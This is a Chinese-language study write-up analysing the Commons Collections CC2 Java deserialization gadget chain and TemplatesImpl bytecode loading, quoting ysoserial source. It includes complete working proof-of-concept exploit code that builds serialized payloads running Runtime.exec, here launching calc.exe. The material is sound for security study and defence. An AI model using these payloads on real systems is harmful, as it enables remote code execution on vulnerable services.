# CC链学习中：

## 前言：

P神的Java安全漫谈中给出的学习路线是先学CC6，因为CC6提供了一个CC1在高版本下的解决条件，但是为了加强自己的分析能力，我还是准备按着顺序来走一遍。

这里的整体思路和调用链，将会主要参考网络上的文章还有ysoserial中的调用链。

## CC2：

### 调用链：

> Gadget chain:  
>  ObjectInputStream.readObject()  
>  PriorityQueue.readObject()  
>  ...  
>  TransformingComparator.compare()  
>  InvokerTransformer.transform()  
>  Method.invoke()  
>  Runtime.exec()

可以看到这里多了几个类，首先了解一下这几个类：

#### PriorityQueue.class:

![](./img/460988808750036456.png)

#### TransformingComparator.class:

![](./img/8386780909028025168.png)

### 分析：

这里不难看出来，整条链子的触发点在PriorityQueue类中。

#### readObejct():

这里，我们首先进入`PriorityQueue#readObject`观察一下方法：

![](./img/4910330588836756428.png)

整个调用顺序是，首先调用了默认的读入，然后调用了readInt()，然后检查读入流数组长度是否超过预期。这部分都是普通的反序列化读入。

随后，从创建Object类的数组开始，其实就是实现了这个类最重要的特性，创建了一个基于堆的队列优先数组。

在for循环中，就是将反序列化数据流中的元素，一个一个存在`queue`这个数组中，然后开始调用函数`heapify()`来进行重新排列。

#### heapify():

这里跟进`heapify()`函数中：

![](./img/7955942060587330311.png)

函数很干净，可以看到这里有一个for循环，然后调用了一个`siftDown()`函数，这个函数是什么呢。

#### siftDown():

![](./img/8073952280628649717.png)

也就是说，这个函数其实就是实现了一个堆排序，也就等于说是整个heapify()函数的核心。

再次跟进一下：

![](./img/8539639442285526852.png)

两个函数：

![](./img/3925414573225472938.png)

这部分函数的效果是一个算法，具体可以自己理解一下，实际上就是将一个堆转换为一个最小堆。

![](./img/764832416186969701.png)

这个方法实际上是差不多的，只是因为我们没有设置`comparator`，所以他强制性的转换了一个`key`对象，作为这个`comparator`对象，用于调用`compareTo()`方法。

因为我们之前在调用链中存在一个TransformingComparator.compare()，因此我们可以知道`comparator`是一个`TransformingComparator`类的对象，用于调用其compare()方法。

这里进入org.apache.commons.collections4.comparators;

可以找到compare()方法:

#### compare()：

![](./img/1898953426861373333.png)

这里可以看到，调用了`this.transformer`的`transform()`方法。因为`this.transformer`这个变量是我们可以控制的，所以可以直接一波转进到我们之前学习过的CC1链子里。

到这里，就算是走通了调用链。

### 初版POC:

    
    
    package org.example;
    
    import org.apache.commons.collections4.Transformer;
    import org.apache.commons.collections4.comparators.TransformingComparator;
    import org.apache.commons.collections4.functors.ChainedTransformer;
    import org.apache.commons.collections4.functors.ConstantTransformer;
    import org.apache.commons.collections4.functors.InvokerTransformer;
    
    import java.io.FileOutputStream;
    import java.io.IOException;
    import java.io.ObjectOutputStream;
    import java.util.PriorityQueue;
    
    public class CC2{
        public static void main(String[] args) throws IOException,ClassNotFoundException {
            Transformer[] transformer = new Transformer[]{
                    new ConstantTransformer(Runtime.class),
                    new InvokerTransformer("getMethod",new Class[]{String.class,Class[].class},new Object[]{"getRuntime",new Class[0]}),
                    new InvokerTransformer("invoke",new Class[]{Object.class,Object[].class},new Object[]{null,new Object[0]}),
                    new InvokerTransformer("exec",new Class[]{String.class},new String[]{"C:\\Windows\\WinSxS\\wow64_microsoft-windows-calc_31bf3856ad364e35_10.0.19041.1_none_6a03b910ee7a4073\\calc.exe"}),
            };
            Transformer chaintransformer = new ChainedTransformer(transformer);
            TransformingComparator comparator = new TransformingComparator(chaintransformer);
            PriorityQueue queue = new PriorityQueue(2,comparator);
            queue.offer(1);
            queue.offer(2);//调用offer()方法随便给队列中添加两个参数，调用add()也可以，add()最后也是调用的offer()方法。
            try{
                FileOutputStream filepath = new FileOutputStream("./CC2.ser");
                ObjectOutputStream object = new ObjectOutputStream(filepath);
                object.writeObject(queue);
            }
            catch (Exception e){
                e.printStackTrace();
            }
        }
    }
    

可以看到这里对queue中的队列添加了两个元素，这是因为PriorityQueue类其实就是一个排列方法，最后完成一个最大或者最小堆，就像我们之前分析siftDown()方法一样。

为了调用这个方法，会要求队列中至少有三个成员，也就是一个非叶子节点和它的左右子节点。

![](./img/6883614092111197525.png)

所以，我们需要让队列中有至少三个成员。

POC看上去好像挺美好的，但是有一个问题，当我运行这个POC的时候，会发现它直接调用了我的计算器，但是不会进行序列化。

![](./img/8345136481359942590.png)

这里步进调试，来看看是怎么回事：  
我们可以发现，在我们添加第二个元素的时候，也就是`queue.offer(2)`的时候，会从offer()函数进入到siftUp()函数。

![](./img/6357693470212089446.png)

因为此时，我们已经设置了comparator的参数，所以这里会直接进入if分支，调用`siftUpUsingComparable()`方法。

![](./img/4761157837372548795.png)

当我们开始调用该函数的时候，会进入if()，然后开始调用`comparator.compare()`方法，这里也就是开始调用`TransformingComparator#compare()`。

![](./img/4248243982516939011.png)

前面会调用两次ChainedTransformer类，也就会触发两次我们设计好的计算器，随后会直接return，直接结束了。因此不会执行后续的代码。

可以看到整体是没什么问题的，只要能改掉这里就行了。

### 修改后POC:

为了达成上述操作，我们就不能进入`siftUpUsingComparator()`方法，也就是不能在创建对象的时候，传入`comparator`参数。

这时，当我们向队列中添加元素的时候，就不会触发，而是触发`siftUpComparator()`方法替代。

![](./img/40922208788023997.png)

可以看到的是，这里是将x，强制转换为了一个Comparable类，然后在if中调用了它的`compareTo()`方法，整个函数过程其实就是进行一个赋值，不会直接结束。

但是赋值完之后，要怎么才能给里面的元素添加我们封装好的`TransformingComparator`类呢？

这里最简单的方式就是通过反射，将我们封装好的类添加进去。

在POC中添加以下代码：

    
    
    Field field = Class.forName("java.util.PriorityQueue").getDeclaredField("comparator");
    field.setAccessible(true);
    field.set(queue,comparator);
    

因为设置了comparator参数，所以等到时候readObject()的时候，就会按照我们想要的调用链开始。

随后调整一下顺序，我们就得到了完整的POC：

    
    
    package org.example;
    
    import org.apache.commons.collections4.Transformer;
    import org.apache.commons.collections4.comparators.TransformingComparator;
    import org.apache.commons.collections4.functors.ChainedTransformer;
    import org.apache.commons.collections4.functors.ConstantTransformer;
    import org.apache.commons.collections4.functors.InvokerTransformer;
    
    import java.io.*;
    import java.lang.reflect.Field;
    import java.util.PriorityQueue;
    
    public class CC2{
        public static void main(String[] args) throws IOException, ClassNotFoundException, NoSuchFieldException, IllegalAccessException {
            Transformer[] transformer = new Transformer[]{
                    new ConstantTransformer(Runtime.class),
                    new InvokerTransformer("getMethod",new Class[]{String.class,Class[].class},new Object[]{"getRuntime",new Class[0]}),
                    new InvokerTransformer("invoke",new Class[]{Object.class,Object[].class},new Object[]{null,new Object[0]}),
                    new InvokerTransformer("exec",new Class[]{String.class},new String[]{"C:\\Windows\\WinSxS\\wow64_microsoft-windows-calc_31bf3856ad364e35_10.0.19041.1_none_6a03b910ee7a4073\\calc.exe"}),
            };
            Transformer chaintransformer = new ChainedTransformer(transformer);
            TransformingComparator comparator = new TransformingComparator(chaintransformer);
            PriorityQueue queue = new PriorityQueue(1);//创建实例。注意下面的顺序改变了。
            queue.add(1);
            queue.add(2);//传入两个参数
            Field field = Class.forName("java.util.PriorityQueue").getDeclaredField("comparator");//反射获取成员变量的field
            field.setAccessible(true);//获取访问权限
            field.set(queue,comparator);//设置参数
            try{
                FileOutputStream filepath = new FileOutputStream("./CC2.ser");
                ObjectOutputStream object = new ObjectOutputStream(filepath);
                object.writeObject(queue);
            }
            catch (Exception e){
                e.printStackTrace();
            }
            try{
                FileInputStream filepath2 = new FileInputStream("./CC2.ser");
                ObjectInputStream input = new ObjectInputStream(filepath2);
                input.readObject();
            }
            catch (IOException error){
                error.printStackTrace();
            }
        }
    }
    

调用效果:

![](./img/4845663126125174276.png)

### 调用方式2：

当然，在上面写的POC是调用的ChainedTransformer类中的链条，在ysoserial中给出的调用链是使用的

> TransformingComparator.compare()  
>  InvokerTransformer.transform()  
>  Method.invoke()  
>  Runtime.exec()

这里的调用思路就和我们之前简单使用`ChainedTransformer`不一样了，这里首先跟一下函数的调用。

![](./img/2140663783044793668.png)

因为我们在调用transform()方法的时候，是传入了参数的，这里直接进else分支，然后调用method.invoke()，这里其实就是直接通过反射，来进行函数的调用。

但是这里反射的对象是input，也就是在调用Transform函数的时候传入的Object，这里回头看一下：

![](./img/2935594158284055574.png)

![](./img/1920585804853893233.png)

因此，我们在调用`InvokerTransformer#transform()`方法中反射的过程的时候，其实是调用的Object类中的`toString()`方法。

这个时候，我们就会发现，调用这个方法只会单纯的返回当前类的名字，没有什么调用方式，那么上述调用链是怎么实现的呢，让我们回头再重新阅读一下ysoserial的源码。

![](./img/6615086970578230529.png)

    
    
    public Queue<Object> getObject(final String command) throws Exception {
            final Object templates = Gadgets.createTemplatesImpl(command);
            // mock method name until armed
            final InvokerTransformer transformer = new InvokerTransformer("toString", new Class[0], new Object[0]);
    
            // create queue with numbers and basic comparator
            final PriorityQueue<Object> queue = new PriorityQueue<Object>(2,new TransformingComparator(transformer));
            // stub data for replacement later
            queue.add(1);
            queue.add(1);
    
            // switch method called by comparator
            Reflections.setFieldValue(transformer, "iMethodName", "newTransformer");
    
            // switch contents of queue
            final Object[] queueArray = (Object[]) Reflections.getFieldValue(queue, "queue");
            queueArray[0] = templates;
            queueArray[1] = 1;
    
            return queue;
    

要看懂ysoserial中的源码，我们首先需要学会一些前置知识，这里主要参考P神的Java安全漫谈。

## Java中动态加载字节码：

### 什么是Java的“字节码”：

严格来说，Java字节码（ByteCode）其实仅仅指的是Java虚拟机执行使用的一类指令，通常被存储在.class文件中。

众所周知，不同平台、不同CPU的计算机指令有差异，但因为Java是一门跨平台的编译型语言，所以这些差异对于上层开发者来说是透明的，上层开发者只需要将自己的代码编译一次，即可运行在不同平台的JVM虚拟机中。

甚至，开发者可以用类似Scala、Kotlin这样的语言编写代码，只要你的编译器能够将代码编译成.class文件，都可以在JVM虚拟机中运行。

![](./img/6902087661717082509.png)

或者这么理解，字节码相较于Java就相当于C语言之于Python，也就是Java语言的底层实现方式，当任意一个文件，只要最后编译后，是一个字节码文件，就可以在JVM中运行。

### 利用URLClassLoader加载远程Class文件：

在Java中，ClassLoader就是用来加载字节码文件最基础的方法，会告诉JVM如何加载这个类，默认的就是通过类的名字来加载类，比如`java.lang.Runtime`。

其中，有一个ClassLoader就是`URLClassLoader`类。

`URLClassLoader`类实际上是我们平时默认使用的AppClassLoader的父类，所以我们基本上就是在理解默认的Java类加载器的工作原理。

正常情况下，Java会根据配置项 `sun.boot.class.path` 和
`java.class.path`中列举到的基础路径（这些路径是经过处理后的 `java.net.URL`
类）来寻找.class文件来加载，而这个基础路径有分为三种情况：

  1. URL未以斜杠 / 结尾，则认为是一个JAR文件，使用 JarLoader 来寻找类，即为在Jar包中寻找.class文件
  2. URL以斜杠 / 结尾，且协议名是 file ，则使用 FileLoader 来寻找类，即为在本地文件系统中寻找.class文件
  3. URL以斜杠 / 结尾，且协议名不是 file ，则使用最基础的 Loader 来寻找类

也就是说，如果我们使用的是HTTP协议，而不是file协议，就会通过URL来远程加载类。

理论上来讲，这里会有SSRF的风险。

P神给了一个例子：

    
    
    package com.govuln;
    import java.net.URL;
    import java.net.URLClassLoader;
    public class HelloClassLoader
    {
        public static void main( String[] args ) throws Exception{ //这里P神放了一个程序http://localhost:8000/Hello.class
            URL[] urls = {new URL("http://localhost:8000/")};
            URLClassLoader loader = URLClassLoader.newInstance(urls);
            Class c = loader.loadClass("Hello");
            c.newInstance();
        }
    }
    

这里可以看到，通过`URLClassLoader.newInstance()`，创建一个新的URLClassLoader类，而这个URLClassLoader类，只能从`urls`变量对应的URL中加载字节码文件。

然后通过`loader.loadClass("Hello")`这段代码加载了Hello.class文件，也就是将这个类Class对象赋值给了变量c，这里等效于创建了一个反射，使用了ClassforName()函数。

所以后面使用c.newInstance()函数来创建对象。

### 利用 ClassLoader#defineClass 直接加载字节码：

实际上，不管是远程加载class文件，还是本地加载class或是jar文件，Java中经历的都是下面这三个方法的调用过程：

![](./img/116854458120684555.png)

也就是在ClassLoader类中，有三个函数的调用

    
    
    loadClass()->findClass()->defineClass()

这三个函数的作用是：

  1. `loadClass()`从已经加载的类缓存、父加载器等位置寻找类（其实就是双亲委派机制），在前面没有找到的情况下执行findClass
  2. `findClass()`根据基础URL指定的方法来加载类的字节码，可能会在本地文件系统，jar包，或是远程http服务器上读取字节码，然后交给下一个函数defineClass()
  3. `defineClass()`的作用就是处理前面传入的字节码，将其处理为真正的Java类。

也就是说，整个字节码的加载过程中，最关键的部分其实是`ClassLoader#defineClass()`，正是这个方法决定了如何将一段字节流转变为一个Java类，Java默认的ClassLoader#defineClass是一个native方法，逻辑写在JVM的C语言代码中。

在这里，P神给了一个展示原理的代码：

这里首先要说明的是，`defineClass()`是一个受保护的方法，所以不能直接进行调用，必须要通过反射的方式来进行调用。

    
    
    package com.govuln;
    import java.lang.reflect.Method;
    import java.util.Base64;
    public class HelloDefineClass {
    public static void main(String[] args) throws Exception {
        Method defineClass =ClassLoader.class.getDeclaredMethod("defineClass", String.class,byte[].class,int.class, int.class);
        defineClass.setAccessible(true);
        byte[] code =Base64.getDecoder().decode("yv66vgAAADQAGwoABgANCQAOAA8IABAKABEAEgcAEwcAFAEA
        Bjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBAApTb3VyY2VGaWxlAQAKSGVs
        bG8uamF2YQwABwAIBwAVDAAWABcBAAtIZWxsbyBXb3JsZAcAGAwAGQAaAQAFSGVsbG8BABBqYXZh
        L2xhbmcvT2JqZWN0AQAQamF2YS9sYW5nL1N5c3RlbQEAA291dAEAFUxqYXZhL2lvL1ByaW50U3Ry
        ZWFtOwEAE2phdmEvaW8vUHJpbnRTdHJlYW0BAAdwcmludGxuAQAVKExqYXZhL2xhbmcvU3RyaW5n
        OylWACEABQAGAAAAAAABAAEABwAIAAEACQAAAC0AAgABAAAADSq3AAGyAAISA7YABLEAAAABAAoA
        AAAOAAMAAAACAAQABAAMAAUAAQALAAAAAgAM");
        Class hello =(Class)defineClass.invoke(ClassLoader.getSystemClassLoader(), "Hello", code,0, code.length);
        hello.newInstance();
         }
    }
    

可以看到这里通过反射，获取了ClassLoader类中的defineClass方法，然后调用这个方法，通过字符串的形式加载了这个类，也就是hello.class。

随后，通过newInstance()新建实例化。

在调用defineClass()这个方法时 ，里面的参数应该这么理解：

![](./img/137765852921454755.png)

也就是说，在上述代码中，我们调用的方法参数意义应该是；

    
    
    (Class)defineClass.invoke(ClassLoader.getSystemClassLoader(), "Hello", code,0, code.length);

`ClassLoader.getSystemClassLoader`是我们给的一个系统类加载器，也就是应用程序类加载器，当我们调用defineClass()函数加载字节码的时候，我们时可以选择一个类加载器的。

`Hello`是我们要定义的类的全限定名

`code`是我们要定义的类的字节码数组

0是字节数组的起始位置

`code.length`是我们传入的字节数组的长度。

**需要注意的是：** 在defineClass被调用的时候，类对象是不会被初始化的，只有这个对象显式地调用器构造函数，初始化代码才能能被执行。

而且，即使是将初始化代码放在类的static块中，在`defineClass()`时候，也无法被直接调用到，因此如果我们想要使用defineClass在目标机上面执行任意代码，就需要想办法调用构造函数。

比如，使用newInstance()函数。

在实际场景中，因为defineClass方法作用域是不开放的，搜易攻击者很少能够直接利用到它，但是它是我们常用的一个攻击链`TemplatesImpl`的基础。

就像是我们现在看到的CC2链条一样。

### 利用TemplatesImpl加载字节码：

虽然大部分的开发者不会用到`defineClass()`方法，但是很少见的，在Java的一个底层类中，运用到了这个方法，也就是我们现在正在学习的`TemplatesImpl`类。

`com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl`

这个类中，定义了一个内部类，`TransletClassLoader`

    
    
    static final class TransletClassLoader extends ClassLoader {
            private final Map<String,Class> _loadedExternalExtensionFunctions;
    
             TransletClassLoader(ClassLoader parent) {
                 super(parent);
                _loadedExternalExtensionFunctions = null;
            }
    
            TransletClassLoader(ClassLoader parent,Map<String, Class> mapEF) {
                super(parent);
                _loadedExternalExtensionFunctions = mapEF;
            }
    
            public Class<?> loadClass(String name) throws ClassNotFoundException {
                Class<?> ret = null;
                // The _loadedExternalExtensionFunctions will be empty when the
                // SecurityManager is not set and the FSP is turned off
                if (_loadedExternalExtensionFunctions != null) {
                    ret = _loadedExternalExtensionFunctions.get(name);
                }
                if (ret == null) {
                    ret = super.loadClass(name);
                }
                return ret;
             }
    
            /**
             * Access to final protected superclass member from outer class.
             */
            Class defineClass(final byte[] b) {
                return defineClass(null, b, 0, b.length);
            }
        }
    

可以看到这个内部类的最后对defineClass方法进行了一次重写，在这里，defineClass方法没有显式的声明其定义域，其作用域就是为default，也就是说这里的defineClass尤其父类的protected类型编程了一个default类型的方法，可以被类外部调用。

从`TransletClassLoader#defineClass()`向前看一下：

    
    
    TemplatesImpl#getOutputProperties() -> TemplatesImpl#newTransformer() ->
    TemplatesImpl#getTransletInstance() -> TemplatesImpl#defineTransletClasses()
    -> TransletClassLoader#defineClass()

![](./img/219299489605318710.png)

在最前面的两个方法，`getOutputProperties()`和`newTransformer()`的作用域是public，可以被外部调用。

当我们执行到这条调用链的最后一步的时候，可以发现是通过对象loader来调用的`defineClass()`函数，这里调用的参数是`_bytecodes[i]`。

这里看一下defineClass()函数中，

    
    
    Class defineClass(final byte[] b) {
                return defineClass(null, b, 0, b.length);
            }
    

可以发现上面传入的`_bytecodes[i]`就是这里的参数b，也就是使用defineClass()来进行加载的字节码。

也就是说，我们可以通过反射的方式来对`_bytecodes`这个byte数组进行赋值，然后让其中的一个元素是我们构造的字节码就可以了。

这里需要注意的是在defineClass()函数中，第一个参数是null，这里就是代表直接使用字节码中的默认类名。

在P神给出的POC中，我们可以看到他设置了这么几个变量：

![](./img/5387872619468346676.png)

  1. bytecodes 是由字节码组成的数组； 
  2. _name 可以是任意字符串，只要不为null即可；
  3. `_tfactory` 需要是一个 `TransformerFactoryImpl` 对象，因为`TemplatesImpl#defineTransletClasses()` 方法里有调用到`_tfactory.getExternalExtensionsMap()` ，如果是null会出错。

至于原因，首先是

![](./img/2864176310078850311.png)

这里，我们要继续链，就不能让`_name`为null

![](./img/778076796958375149.png)

这里，因为我们创建一个新的TransletClassLoader类的时候，需要调用到方法，所以_tfactory有不能是null。

**还有一个值得注意的点**

另外，值得注意的是， TemplatesImpl 中对加载的字节码是有一定要求的：这个字节码对应的类必须  
是 `com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet` 的子类。

所以在获取字节码的时候必须要保证我们构造的类是AbstractTranslet的子类。

### Javassit库：

Javassist是一个开源的分析、编辑和创建Java字节码的类库，可以直接编辑和生成Java生成的字节码。  
能够在运行时定义新的Java类，在JVM加载类文件时修改类的定义。  
Javassist类库提供了两个层次的API，源代码层次和字节码层次。源代码层次的API能够以Java源代码的形式修改Java字节码。字节码层次的API能够直接编辑Java类文件。

向Maven的`Pom.xml`文件中，添加以下字段，以导入依赖：

    
    
    <!-- https://mvnrepository.com/artifact/javassist/javassist -->
        <dependencies>
            <dependency>
                <groupId>javassist</groupId>
                <artifactId>javassist</artifactId>
                <version>3.12.1.GA</version>
            </dependency>
        </dependencies>
    

![](./img/2722558045895880778.png)

在这个包中，主要调用到的方法是:

#### ClassPool:

ClassPool是CtClass对象的容器，它按需读取类文件来构造CtClass对象，并且保存CtClass对象以便以后使用，其中键名是类名称，值是表示该类的CtClass对象。

常用方法：

  * `static ClassPool getDefault()`：返回默认的ClassPool，一般通过该方法创建我们的ClassPool；
  * `ClassPath insertClassPath(ClassPath cp)`：将一个ClassPath对象插入到类搜索路径的起始位置；
  * `ClassPath appendClassPath`：将一个ClassPath对象加到类搜索路径的末尾位置；
  * `CtClass makeClass`：根据类名创建新的CtClass对象；
  * `CtClass get(java.lang.String classname)`：从源中读取类文件，并返回对CtClass 表示该类文件的对象的引用；

#### **CtClass：**

CtClass类表示一个class文件，每个CtClass对象都必须从ClassPool中获取。

常用方法：

  * `void setSuperclass(CtClass clazz)`：更改超类，除非此对象表示接口；
  * `byte[] toBytecode()`：将该类转换为类文件；
  * `CtConstructor makeClassInitializer()`：制作一个空的类初始化程序（静态构造函数）；

#### 示例：

获取字节码：

    
    
    ClassPool pool = ClassPool.getDefault();
    CtClass clazz = pool.get(com.classloader.TemplatesImplEvil.class.getName());
    byte[] code = clazz.toBytecode();
    

创建一个新类：

    
    
    import javassist.*;
    
    public class javassit_test {
    
        public static void createPerson() throws Exception{
            //实例化一个ClassPool容器
            ClassPool pool = ClassPool.getDefault();
            //新建一个CtClass，类名为Cat
            CtClass cc = pool.makeClass("Cat");
            //设置一个要执行的命令
            String cmd = "System.out.println(\"javassit_test succes!\");";
            //制作一个空的类初始化，并在前面插入要执行的命令语句
            cc.makeClassInitializer().insertBefore(cmd);
            //重新设置一下类名
            String randomClassName = "EvilCat" + System.nanoTime();
            cc.setName(randomClassName);
            //将生成的类文件保存下来
            cc.writeFile();
            //加载该类
            Class c = cc.toClass();
            //创建对象
            c.newInstance();
        }
    
        public static void main(String[] args) {
            try {
                createPerson();
            } catch (Exception e){
                e.printStackTrace();
            }
        }
    }
    

### 关于调用方式2的TemplatesImpl利用链分析：

这条调用链，在前面部分都是一样，主要的区别是从

> InvokerTransformer.transform()

开始的。

InvokerTransformer这个类，最关键的就是它的transform()函数，这个里面通过反射的方式完成了代码执行，这里我们首先看清楚这里调用的是哪一个方法。

![](./img/4595779344661580345.png)

![](./img/2837390183277095853.png)

在这里，我们可以发现，虽然一开始在实例化类的时候，这里写的是`toString()`方法，但是后面，通过反射的方式，将这里的方法名改成了`newTransformer`。也就是说，我们调用的是`newTransformer()`方法。

那么，我们调用的是哪个类中的`newTransformer()`方法呢。

因为InvokerTransformer#transoform()是反射传入的input参数，这里我们就需要知道传入的参数是哪个。

在我们之前的分析中，可以知道传入的参数是来自这里：

![](./img/3646521792856913374.png)

第一个i是整形，后面的是queue数组中的一个元素。

也就是说这里，其实我们反射的input就是`queue[i]`。

![](./img/3994137878316953195.png)

这里可以看到，ysoserial通过反射的方式，修改了数组的第一个元素，为templates。

![](./img/2917085686271373918.png)

也就是，我们调用的是templates这个对象中的newTransformer方法。

跟入：

![](./img/6203721673781288140.png)

可以看到，这里如果if中判定条件为true，则调用一个被重载过的createTemplatesImpl方法。

    
    
    public static <T> T createTemplatesImpl ( final String command, Class<T> tplClass, Class<?> abstTranslet, Class<?> transFactory )
                throws Exception {
            final T templates = tplClass.newInstance();//创建了一个org.apache.xalan.xsltc.trax.TemplatesImpl的实例对象
    
            // use template gadget class
            ClassPool pool = ClassPool.getDefault(); //创建一个ClassPool实例，默认方式
            pool.insertClassPath(new ClassClassPath(StubTransletPayload.class)); //将内部类StubTransletPayload添加入路径
            pool.insertClassPath(new ClassClassPath(abstTranslet));//同上，但是这里是org.apache.xalan.xsltc.runtime.AbstractTranslet
            final CtClass clazz = pool.get(StubTransletPayload.class.getName());//获取对应类的CtClass对象。
            // run command in static initializer
            // TODO: could also do fun things like injecting a pure-java rev/bind-shell to bypass naive protections
            String cmd = "java.lang.Runtime.getRuntime().exec(\"" +
                command.replace("\\", "\\\\").replace("\"", "\\\"") +
                "\");"; //定义指令
            clazz.makeClassInitializer().insertAfter(cmd);//创建一个新的空初始化程序，添加静态程序块，像静态程序块中添加上述代码
            // sortarandom name to allow repeated exploitation (watch out for PermGen exhaustion)
            clazz.setName("ysoserial.Pwner" + System.nanoTime());//修改类名，类名中包含系统的纳秒级别时间，避免冲突
            CtClass superC = pool.get(abstTranslet.getName());//同上，但是这里是org.apache.xalan.xsltc.runtime.AbstractTranslet
            clazz.setSuperclass(superC);//将superC设置为clazz的父类
    
            final byte[] classBytes = clazz.toBytecode();//获取字节码
    
            // inject class bytes into instance
            Reflections.setFieldValue(templates, "_bytecodes", new byte[][] {
                classBytes, ClassFiles.classAsBytes(Foo.class)
            });//反射方式，将字节码注入，就像我们之前的分析一样。
    
            // required to make TemplatesImpl happy
            Reflections.setFieldValue(templates, "_name", "Pwnr");//随便设置一个字符串，不是null即可
            Reflections.setFieldValue(templates, "_tfactory", transFactory.newInstance());//同分析
            return templates;
        }
    

通过上述代码分析，这里我们可以发现，我们已经成功的将`org.apache.xalan.xsltc.trax.TemplatesImpl`的字节码注入到了TemplatesImpl的defineClass()方法中，进行动态字节码加载。

且，这个类的父类是`org.apache.xalan.xsltc.runtime.AbstractTranslet`。

也就是说，这里我们调用函数返回的templates是一个特殊的`org.apache.xalan.xsltc.trax.TemplatesImpl`类。

回到之前，`InvokerTransformeri#transform()`，这里就是调用的上述类的`newTransformer()`方法。

这里，就回到了我们TemplatesImpl类调用的入口了。

随后，它会完成我们给他注入的字节码，然后开始调用其内部的static代码块，也就是这一部分：

![](./img/1607245100084729275.png)

完成rce。

**这里还有个小问题：**

我们知道，使用这种加载字节码的方式，在没有newInstance()的时候，是不会运行静态代码块中的内容的，这里是怎么做到的运行我们写的代码的？

以及为什么要将字节码的父类设为`org.apache.xalan.xsltc.runtime.AbstractTranslet`。

这两个问题其实可以一起解决：

这是因为，在`defineTransletClasses()`中，也就是我们调用load.defineClass()的部分，

![](./img/395439723147493591.png)

这里，会获取我们注入字节码，创建的类的父类。

如果父类是`ABSTRACT_TRANSLET`则将`_transletIndex`设为`i`。

这里即不会报错，同时，当函数执行结束，会返回到上一部分，也就是`getTransletInstance()`方法中。

![](./img/1743194110305058568.png)

这里，会使用到我们之前得到的`_transletIndex`就会完成`newInstance()`，随后即可调用static方法中的函数了。

也就是说，需要上述两个条件，是为了满足父类的要求，设置_transletIndex，然后完成newInstance()。

### TemplatesImpl链POC：

    
    
    package org.example;
    
    import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
    import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
    import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
    import javassist.*;
    import org.apache.commons.collections4.comparators.TransformingComparator;
    import org.apache.commons.collections4.functors.InvokerTransformer;
    import java.io.*;
    import java.lang.reflect.Field;
    import java.util.PriorityQueue;
    
    public class POC2{
        public static void main(String[] args) throws NoSuchFieldException, IllegalAccessException {
            InvokerTransformer invokerTransformer = new InvokerTransformer("toString", new Class[0], new Object[0]);
            TransformingComparator comparator = new TransformingComparator(invokerTransformer);
            PriorityQueue queue = new PriorityQueue(1);
            queue.add(1);
            queue.add(2);
            //反射,设置comparator,InvokerTransformer中方法为newTransformer
            try {
                Field field = Class.forName("java.util.PriorityQueue").getDeclaredField("comparator");
                field.setAccessible(true);
                field.set(queue, comparator);
                Field field1 = InvokerTransformer.class.getDeclaredField("iMethodName");
                field1.setAccessible(true);
                field1.set(invokerTransformer,"newTransformer");
            } catch (IllegalAccessException | ClassNotFoundException e) {
                e.printStackTrace();
            } catch (NoSuchFieldException e) {
                throw new RuntimeException(e);
            }
    
            TemplatesImpl templates = new TemplatesImpl();
            //创建类字节码和恶意指令
            try {
                ClassPool pool = ClassPool.getDefault();
                pool.insertClassPath(new ClassClassPath(com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet.class));
                CtClass poc = pool.makeClass("Poc");
                String cmd = "java.lang.Runtime.getRuntime().exec(\"C:\\\\Windows\\\\WinSxS\\\\wow64_microsoft-windows-calc_31bf3856ad364e35_10.0.19041.1_none_6a03b910ee7a4073\\\\calc.exe\");";
                poc.makeClassInitializer().insertBefore(cmd);
                String RandName = "POC"+System.nanoTime();
                poc.setName(RandName);
                poc.setSuperclass(pool.get(com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet.class.getName()));
                byte[] classbyte = poc.toBytecode();
                byte[][] trueclassbyte = new byte[][]{classbyte};
                //反射设置值
                Field field2 = Class.forName("com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl").getDeclaredField("_bytecodes");
                field2.setAccessible(true);
                field2.set(templates,trueclassbyte);
                Field field3 = Class.forName("com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl").getDeclaredField("_name");
                field3.setAccessible(true);
                field3.set(templates,"Ho1L0w-By");
                Field field4 = Class.forName("com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl").getDeclaredField("_tfactory");
                field4.setAccessible(true);
                field4.set(templates,new TransformerFactoryImpl());
            } catch (CannotCompileException | NotFoundException | IOException | ClassNotFoundException |
                     NoSuchFieldException | IllegalAccessException e) {
                throw new RuntimeException(e);
            }
            Field field5 = java.util.PriorityQueue.class.getDeclaredField("queue");
            Object[] queueArray = new Object[]{templates,1};
            field5.setAccessible(true);
            field5.set(queue,queueArray);
            try{
                ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream("./CC2.ser"));
                outputStream.writeObject(queue);
                outputStream.close();
                ObjectInputStream inputStream = new ObjectInputStream(new FileInputStream("./CC2.ser"));
                inputStream.readObject();
            }catch(Exception e){
                e.printStackTrace();
            }
        }
    }
    

![](./img/7054200033586041521.png)

这个POC写的有点长，主要是因为我没有专门写一个反射用函数，这里每次反射都是手来的，下次加上。

## 总结：

很有趣的一次跟链子，感觉Java这个动态加载字节码的做法，给了它这种强类型语言不匹配的灵活性，非常爽。

